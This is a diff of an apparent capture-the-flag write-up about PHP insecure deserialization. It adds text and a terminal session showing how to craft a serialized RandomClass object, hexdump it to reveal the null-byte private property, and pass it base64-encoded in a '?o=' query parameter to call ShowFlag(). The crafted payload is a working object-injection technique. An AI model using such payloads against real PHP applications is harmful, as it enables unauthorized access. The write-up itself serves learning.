@@ -76,7 +76,7 @@ From the PHP documentation, ["If a value of any other type is converted to an ob
 
 The next magic method is __set. Reading PHP docs, ["__set() is run when writing data to inaccessible properties."](http://php.net/manual/en/language.oop5.overloading.php#language.oop5.overloading.members). This looks potentially promising. The __get() magic method is also defined here, but what really catches the eyes is the ShowFlag() function. If only it was possible to set the variables $this->uStruct->time and $this->uStruct->flag and retrieve the flag...
 
-
+With the leak of the RandomClass class, we can create our own serialized object, base64 encode it, and provide as the value for "?o=" within the HTTP query string.
 
 {% highlight php %}
 $obj = new RandomClass();
@@ -84,9 +84,23 @@ $obj->time = "1";
 $obj->flag = "Please?";
 $obj->action = "ShowFlag";
 echo serialize($obj);
-
-/* 
-Output:
-O:11:"RandomClass":1:{s:20:"RandomClassuStruct";O:8:"stdClass":3:{s:4:"time";s:1:"1";s:4:"flag";s:7:"Please?";s:6:"action";s:8:"ShowFlag";}}
-*/
 {% endhighlight %}
+
+{% highlight bash %}
+root@kali:~/Challenge41# php sploit.php 
+O:11:"RandomClass":1:{s:20:"RandomClassuStruct";O:8:"stdClass":3:{s:4:"time";s:1:"1";s:4:"flag";s:7:"Please?";s:6:"action";s:8:"ShowFlag";}}
+
+root@kali:~/Challenge41# php sploit.php | hexdump -C
+00000000  4f 3a 31 31 3a 22 52 61  6e 64 6f 6d 43 6c 61 73  |O:11:"RandomClas|
+00000010  73 22 3a 31 3a 7b 73 3a  32 30 3a 22 00 52 61 6e  |s":1:{s:20:".Ran|
+00000020  64 6f 6d 43 6c 61 73 73  00 75 53 74 72 75 63 74  |domClass.uStruct|
+00000030  22 3b 4f 3a 38 3a 22 73  74 64 43 6c 61 73 73 22  |";O:8:"stdClass"|
+00000040  3a 33 3a 7b 73 3a 34 3a  22 74 69 6d 65 22 3b 73  |:3:{s:4:"time";s|
+00000050  3a 31 3a 22 31 22 3b 73  3a 34 3a 22 66 6c 61 67  |:1:"1";s:4:"flag|
+00000060  22 3b 73 3a 37 3a 22 50  6c 65 61 73 65 3f 22 3b  |";s:7:"Please?";|
+00000070  73 3a 36 3a 22 61 63 74  69 6f 6e 22 3b 73 3a 38  |s:6:"action";s:8|
+00000080  3a 22 53 68 6f 77 46 6c  61 67 22 3b 7d 7d 0a 0a  |:"ShowFlag";}}..|
+00000090
+{% endhighlight %}
+
+
